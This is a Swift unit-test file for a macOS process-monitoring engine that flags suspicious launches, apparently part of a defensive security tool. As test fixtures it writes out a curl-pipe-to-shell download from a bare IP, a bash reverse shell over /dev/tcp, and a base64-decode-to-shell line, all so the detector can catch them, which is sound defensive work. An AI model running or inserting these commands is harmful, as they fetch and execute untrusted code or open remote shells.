import XCTest
@testable import GhostProcessSniperCore

final class SentinelEngineTests: XCTestCase {
    private let now = Date(timeIntervalSince1970: 1_900_000_000)

    private func process(_ pid: Int32, _ name: String, _ path: String, command: String? = nil, parent: Int32 = 1) -> ProcessMetrics {
        ProcessMetrics(identity: ProcessIdentity(pid: pid, startTimeSeconds: 100, startTimeMicroseconds: UInt64(pid)),
                       parentPID: parent, userID: 501, ownerName: "me", name: name, executablePath: path,
                       commandLine: command ?? path, residentMemoryBytes: 10_000_000, physicalFootprintBytes: 10_000_000,
                       virtualMemoryBytes: 20_000_000, cpuPercent: 0, totalProcessorSeconds: 1, threadCount: 1,
                       isSystemProcess: SentinelCatalog.isSystemLocation(path), sampledAt: now)
    }

    private var baseline: [ProcessMetrics] {
        [
            process(300, "Google Chrome", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"),
            process(301, "Finder", "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder"),
        ]
    }

    func testBaselineIsNotAFloodOfLaunches() async {
        let engine = SentinelEngine(live: .rulesOnly)
        let report = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        XCTAssertTrue(report.launches.isEmpty)
        XCTAssertTrue(report.findings.isEmpty)
    }

    func testNewAttackChainBecomesAFindingAndAFeedEntry() async {
        let engine = SentinelEngine(live: .rulesOnly)
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let attack = process(400, "zsh", "/bin/zsh", command: "zsh -c curl -s http://1.2.3.4/a | sh", parent: 300)
        let report = await engine.ingest(processes: baseline + [attack], uiVisible: true, now: now.addingTimeInterval(1))

        XCTAssertEqual(report.findings.first?.severity, .dangerous)
        XCTAssertEqual(report.findings.first?.lineageText, "Google Chrome › zsh")
        XCTAssertEqual(report.launches.first?.name, "zsh")
        XCTAssertEqual(report.launchesLastMinute, 1)
        XCTAssertEqual(report.activeFindingCount, 1)
    }

    func testFindingOutlivesItsProcessThenExpires() async {
        let engine = SentinelEngine(live: .rulesOnly)
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let attack = process(401, "bash", "/bin/bash", command: "bash -i >& /dev/tcp/10.0.0.8/4444 0>&1", parent: 300)
        _ = await engine.ingest(processes: baseline + [attack], uiVisible: true, now: now.addingTimeInterval(1))

        let gone = await engine.ingest(processes: baseline, uiVisible: true, now: now.addingTimeInterval(2))
        XCTAssertEqual(gone.findings.first?.isRunning, false, "an exited attack stays visible as history")
        XCTAssertNil(gone.highestSeverity, "only running findings set the live level")

        let later = await engine.ingest(processes: baseline, uiVisible: true, now: now.addingTimeInterval(SentinelEngine.findingRetention + 5))
        XCTAssertTrue(later.findings.isEmpty)
    }

    func testDismissAndTrustHideFindings() async {
        let engine = SentinelEngine(live: .rulesOnly)
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let tunnel = process(402, "ngrok", "/opt/homebrew/bin/ngrok", command: "ngrok http 3000")
        let report = await engine.ingest(processes: baseline + [tunnel], uiVisible: true, now: now.addingTimeInterval(1))
        let finding = try? XCTUnwrap(report.findings.first)
        XCTAssertEqual(finding?.severity, .notable)

        await engine.dismiss(findingID: finding?.id ?? "")
        let dismissed = await engine.currentReport
        XCTAssertTrue(dismissed.findings.isEmpty)
        XCTAssertEqual(dismissed.dismissedCount, 1)

        let other = process(403, "ngrok", "/opt/homebrew/bin/ngrok", command: "ngrok tcp 22")
        await engine.setTrustedPaths(["/opt/homebrew/bin/ngrok"])
        let trusted = await engine.ingest(processes: baseline + [tunnel, other], uiVisible: true, now: now.addingTimeInterval(2))
        XCTAssertTrue(trusted.findings.isEmpty, "a trusted program is never flagged")
    }

    func testLateArgumentsAreJudgedAgain() async {
        let engine = SentinelEngine(live: .rulesOnly)
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let bare = process(404, "sh", "/bin/sh", command: "/bin/sh")
        _ = await engine.ingest(processes: baseline + [bare], uiVisible: true, now: now.addingTimeInterval(1))
        let full = process(404, "sh", "/bin/sh", command: "/bin/sh -c echo aGk= | base64 -d | sh")
        let report = await engine.ingest(processes: baseline + [full], uiVisible: true, now: now.addingTimeInterval(2))
        XCTAssertTrue(report.findings.contains { $0.signals.contains { $0.kind == .encodedPayload } })
    }

    func testAppHelpersStayOutOfTheFeed() async {
        let engine = SentinelEngine(live: .rulesOnly)
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let helper = process(405, "Google Chrome Helper",
            "/Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Helpers/Google Chrome Helper.app/Contents/MacOS/Google Chrome Helper",
            command: "--type=gpu-process", parent: 300)
        let tool = process(406, "rg", "/opt/homebrew/bin/rg", command: "rg TODO")
        let report = await engine.ingest(processes: baseline + [helper, tool], uiVisible: true, now: now.addingTimeInterval(1))
        XCTAssertEqual(report.launches.map(\.name), ["rg"])
    }

    func testUnchangedTicksKeepTheSameRevision() async {
        let engine = SentinelEngine(live: .rulesOnly)
        let first = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let second = await engine.ingest(processes: baseline, uiVisible: true, now: now.addingTimeInterval(1))
        XCTAssertEqual(first.revision, second.revision, "a quiet tick must not republish the Security page")
    }
}
